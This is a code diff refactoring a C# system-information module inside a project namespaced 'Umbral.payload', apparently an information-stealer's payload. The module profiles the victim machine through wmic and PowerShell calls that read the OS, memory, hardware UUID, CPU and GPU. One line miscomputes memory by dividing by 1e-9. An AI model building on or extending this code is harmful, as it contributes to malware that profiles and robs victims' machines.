@@ -23,14 +23,14 @@ namespace Umbral.payload.SystemInfo
     {
         internal static async Task<GeneralSystemInfo> GetInfo()
         {
-            var computerName = Environment.MachineName;
+            string computerName = Environment.MachineName;
             string computerOs;
             string totalMemory;
             string uuid;
             string gpu;
             string cpu;
 
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "wmic.exe";
                 process.StartInfo.Arguments = "os get Caption";
@@ -44,7 +44,7 @@ namespace Umbral.payload.SystemInfo
                 computerOs = computerOs.Split('\n')[1].Trim();
             }
 
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "wmic.exe";
                 process.StartInfo.Arguments = "computersystem get totalphysicalmemory";
@@ -59,7 +59,7 @@ namespace Umbral.payload.SystemInfo
                 totalMemory = Math.Round(Convert.ToInt64(totalMemory) / 1e-9).ToString().Split('.')[0] + " GB";
             }
 
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "wmic.exe";
                 process.StartInfo.Arguments = "csproduct get uuid";
@@ -73,7 +73,7 @@ namespace Umbral.payload.SystemInfo
                 uuid = uuid.Split('\n')[1].Trim();
             }
 
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "powershell.exe";
                 process.StartInfo.Arguments =
@@ -88,7 +88,7 @@ namespace Umbral.payload.SystemInfo
                 cpu = cpu.Trim();
             }
 
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "wmic";
                 process.StartInfo.Arguments = "path win32_VideoController get name";
